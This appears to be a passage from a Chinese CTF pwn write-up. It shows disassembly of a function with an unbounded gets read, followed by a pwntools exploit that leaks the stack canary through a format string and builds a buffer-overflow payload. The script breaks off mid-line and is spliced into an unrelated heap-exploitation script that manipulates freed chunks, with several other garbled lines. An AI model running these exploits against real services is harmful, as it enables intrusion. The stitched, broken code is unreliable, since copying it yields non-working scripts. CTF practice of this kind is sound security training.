    .text:0000000000001390                 mov     rdi, rdx
    .text:0000000000001393                 repne scasb
    .text:0000000000001395                 mov     rax, rcx
    .text:0000000000001398not     rax
    .text:000000000000139B                 lea     rdx, [rax-1]
    .text:000000000000139F                 lea     rax, [rbp-60h]
    .text:00000000000013A3                 add     rax, rdx
    .text:00000000000013A6                 mov     word ptr [rax], 0A21h
    .text:00000000000013AB                 mov     byte ptr [rax+2], 0
    .text:00000000000013AF                 lea     rax, [rbp-60h]
    .text:00000000000013B3                 mov     rdi, rax
    .text:00000000000013B6                 mov     eax, 0
    .text:00000000000013BB                 call    sub_1100
    .text:00000000000013C0                 lea     rdi, aAnythingElse ; "Anything else? "
    .text:00000000000013C7                 mov     eax, 0
    .text:00000000000013CC                 call    sub_1100
    .text:00000000000013D1                 lea     rax, [rbp-40h]
    .text:00000000000013D5                 mov     rdi, rax
    .text:00000000000013D8                 mov     eax, 0
    .text:00000000000013DD                 call    sub_1110       ; gets读入数据，未限制大小
    .text:00000000000013E2                 nop
    .text:00000000000013E3                 mov     rax, [rbp-8]
    .text:00000000000013E7                 xor     rax, fs:28h
    .text:00000000000013F0                 jz      short locret_13F7
    .text:00000000000013F2                 call    sub_10D0
    .text:00000000000013F7
    .text:00000000000013F7 locret_13F7:                            ; CODE XREF: sub_132F+C1↑j
    .text:00000000000013F7                 leave
    .text:00000000000013F8                 retn
    .text:00000000000013F8; } // starts at 132F
    .text:00000000000013F8 sub_132F        endp
利用代码如下所示：
    from pwn import*
    importstruct
    fs = "%17$lx,%19$lx"
    flag = 0x0000000000001231
    ret_offset = 0x146f
    p = remote('127.0.0.1', 20701)
    #p = process('./canary')
    print((p.recvuntil('name? ')).decode())
    p.sendline(fs.encode())
    buf = (p.recvuntil('!\n').decode())
    print(buf)
    data = buf.split()[4].split('!')[0]
    canary = (int((data.split(',')[0]), 16))
    ret = (int((data.split(',')[1]), 16))
    print(canary)
    print(ret)
    print(p.recvuntil('? ').decode())
    payload = (("A"*56).encode())
    payload += struct.pack(" 3
    """
    HEAP_BASE = 0
    LIBC_BASE = 0
    def create_page(size):
      io.sendline("1")
      io.recvuntil("both sides?")
    if240 ")
    # shellcode = asm(shellcraft.sh())
    length = 0xf0-8
    biglength = 0xf0
    print("[*]First Create")
    create_page(0x1e0)  
    #load_page(0, cyclic(0x1e0))
    payload = b"A"*8
    payload += p64(0x331)
    load_page(0, payload)
    io.sendline()
    create_page(0x40) 
    create_page(0x50)
    create_page(0x60)
    create_page(40)
    create_page(0x1e0)  
    create_page(0x90)
    create_page(0xf0)  
    create_page(0xf0)  
    create_page(0xf0)  
    create_page(0xf0)  
    create_page(0xf0)  
    create_page(0xf0)  
    create_page(0xf0)  
    print("[*]Remove last 7")
    remove_page(7)
    remove_page(8)
    remove_page(9)
    remove_page(10)
    remove_page(11)
    remove_page(12)
    remove_page(13)
    print("[*]Create 0xf0")
    create_page(0xf0)  
    print("[*]Heap Leak")
    get_heapleak(7)
    print("[*]Remove last")
    remove_page(7)
    #7
    create_page(0x1e0)  
    create_page(0x1e0)  
    create_page(0x1e0)  
    create_page(0x1e0)  
    create_page(0x1e0)  
    create_page(0x1e0)  
    create_page(0x1e0)  
    create_page(0x1e0)  
    create_page(0x1e0)  
    create_page(0x1e0)  #keep from merging with top
    remove_page(7)
    remove_page(8)
    remove_page(9)
    remove_page(10)
    remove_page(11)
    remove_page(12)
    remove_page(13)